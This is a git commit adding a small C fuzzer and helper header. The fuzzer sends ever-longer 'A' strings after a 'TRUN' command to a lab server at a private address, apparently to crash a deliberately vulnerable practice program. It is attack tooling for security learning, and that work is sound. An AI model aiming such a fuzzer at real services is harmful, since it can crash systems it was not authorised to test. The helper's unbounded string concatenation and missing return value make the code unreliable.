e3fde1c161859ca263e3aa39896888d640472405
Beko K <101501854+amaym0nn@users.noreply.github.com>
2023-02-13 21:51:59 +0000

    Fuzzing Script

---
+++ fuzzing.c
@@ -0,0 +1,45 @@
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <errno.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include "utils.h"
+#define PORT 9999
+#define IP "192.168.0.7"
+
+int main() {
+    char buff[10000] = "TRUN /.:/";
+    char addStr[100] = "AAAAAAA";
+    int nm = 100;
+    int x = 0;
+     while(1) {
+        int scket = socket(AF_INET, SOCK_STREAM, 0);
+        if (scket == -1) {
+            printf("%s\n", strerror(errno));
+            return EXIT_FAILURE;
+        }
+        struct sockaddr_in sock;
+            sock.sin_addr.s_addr = inet_addr(IP);
+            sock.sin_port = htons(PORT);
+            sock.sin_family = AF_INET;
+            int cnt = connect(scket, (struct sockaddr*)&sock, sizeof(sock));
+            if (cnt == -1) {
+                printf("%s\n", strerror(errno));
+                return EXIT_FAILURE;
+            }
+            for(; x < nm; x++) {
+                concStr(buff, addStr);
+	  	printf("Buff Lenght --> %ld\n", strlen(buff));
+	   }
+            int wr = write(scket, buff, sizeof(buff));
+            if (wr == -1) {
+                printf("%s\n", strerror(errno));
+            }
+            nm += 100;
+            sleep(1);
+     }
+}
---
+++ utils.h
@@ -0,0 +1,23 @@
+#include <stdio.h>
+#include <stdlib.h>
+
+int len = 0;
+
+int strLenght(char *str) {
+   int i = 0;
+    for(; str[i] != '\x00'; i++) {
+      len++;
+    }
+}
+
+char *concStr(char *str, char *addStr) {
+   int x = 0;
+   int y = 0;
+    for(; str[x] != '\x00'; x++);
+    if (str[x] == '\x00') {
+       for (; addStr[y] != '\x00'; y++) {
+         str[x] = addStr[y];
+         x++;
+       }
+    }
+}
